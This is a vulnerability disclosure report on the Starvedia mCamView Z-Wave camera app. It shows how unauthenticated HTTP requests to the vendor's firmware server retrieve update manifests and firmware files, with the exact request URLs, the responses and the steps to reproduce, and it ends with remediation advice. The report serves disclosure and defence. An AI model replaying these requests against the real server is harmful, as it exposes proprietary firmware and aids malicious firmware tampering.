# Vulnerability Report - com.starvedia.mCamView.zwave- Incorrect Access Control

**Product:** `com.starvedia.mCamView.zwave`

**Vendor:** [Plug n Play Camera](http://www.starvedia.com/)

**Version:** 5.5.1

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.starvedia.mCamView.zwave` , developed by **Plug n Play Camera**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTP requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `firmware_link, module_link` Field values in the `BuildConfig`class provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003202513940](https://s2.loli.net/2024/10/03/zwPa2ml7xTSGhD1.png)

   ![image-20241003202531276](https://s2.loli.net/2024/10/03/O5e8JVztpYMoAPv.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET http://www.starvedia.com/AutoUpgrade/Httpversions.json HTTP/1.0
   User-Agent: Fiddler
   Host: www.starvedia.com
   ```

   ```http
   GET http://www.starvedia.com/AutoUpgrade/UpgradeFilename.json HTTP/1.0
   User-Agent: Fiddler
   Host: www.starvedia.com
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Connection: close
   Content-Length: 7219
   Accept-Ranges: bytes
   Content-Type: application/json
   Date: Thu, 03 Oct 2024 12:26:54 GMT
   Etag: "1c33-6149fe965e04e"
   Last-Modified: Wed, 27 Mar 2024 08:08:28 GMT
   Server: Apache/2.4.6 (CentOS) PHP/5.4.16
   
   {
   "vendor":"starvidia",
   "products":
   [{
   "model":"IC502wp",
   "version":"030715",
   "url":"http://www.starvedia.com/AutoUpgrade/Firmware/IC502wp-cloud-030715-n.f",
   "md5":"",
   "type":"regular",
   "source":"*",
   "devices":"*",
   "cfgVersion":"3",
   "cfgUrl":"http://www.starvedia.com/AutoUpgrade/Config/gen_502wp_003.cfg"
   },
   {
   "model":"IC717w",
   "version":"030708",
   "url":"http://www.starvedia.com/AutoUpgrade/Firmware/IC717w-cloud-030708-n.f",
   "md5":"",
   "type":"regular",
   "source":"*",
   "devices":"*",
   "cfgVersion":"2",
   "cfgUrl":"http://www.starvedia.com/AutoUpgrade/Config/gen_717w_002.cfg"
   },
   ......
   ```

   ```http
   HTTP/1.1 200 OK
   Connection: close
   Content-Length: 3972
   Accept-Ranges: bytes
   Content-Type: application/json
   Date: Thu, 03 Oct 2024 12:28:21 GMT
   Etag: "f84-61ee61eb2b017"
   Last-Modified: Mon, 05 Aug 2024 02:06:06 GMT
   Server: Apache/2.4.6 (CentOS) PHP/5.4.16
   
   {
     "Formatt": 
       {
         "UpgeadeFilename": "ModelName"
       }
     ,
     "Generic": 
       {
         "G1": "IC717w",
         "G2": "IC717HD",
         "G3": "IC737w",
         "G4": "IC711w",
         "G5": "IC727w",
         "G6": "IC731w",
         "G7": "IC722w",
         "G8": "IC502HD",
         "G9": "IC737wp",
         "G10": "IC721w",
         "G11": "IC727FHD",
         "G12": "IC731FHD",
         "G13": "IC737FHD",
         "G14": "IC727LTE",
         "G15": "IC733",
         "G16": "D1w",
         "G17": "D1",
         "G18": "IC722w1",
         "G19": "IC727FHD-1",
         "G27": "IC722w3",
   	  "G33": "IC180",
   	  "G36": "IC735",
   	  "G37": "IC180LTE",
         "Z0": "IC717z",
         "Z1": "IC731z",
         "Z2": "IC722z",
         "Z3": "G1",
         "Z4": "IC731zp",
         "Z5": "IC731zFHD",
         "Z6": "D1z",
         "Z7": "D1wz",
         "Z8": "IC737zFHD",
         "Z9": "G1-1",
         "Z10": "IC722z1",
         "Z11": "IC731zFHD1",
         "Z12": "G1-1w",
         "Z13": "G1-1a",
         "Z14": "D1wz1",
         "Z15": "IC722z2",
         "Z17": "IC722z3",
         "J1": "IC722w1_JSS",
   	  "B3": "D1w3_ISeed"
       }
     ,
   ......
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003203043784](https://s2.loli.net/2024/10/03/xbIhLE47J8vAyHO.png)

   In total, we successfully downloaded **46 firmware** by exploiting the vulnerability.

## Impact

An attacker can exploit this vulnerability to:

- Download the latest firmware before it is officially released.
- Analyze the firmware for vulnerabilities or proprietary information.
- Create modified firmware images with malicious code.
- Distribute compromised firmware updates to unsuspecting users.

## Remediation

- Implement proper access control on the firmware server, such as device ID and user ID verification.
- Enhance the app's firmware update mechanism to include authentication credentials in the requests.

## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.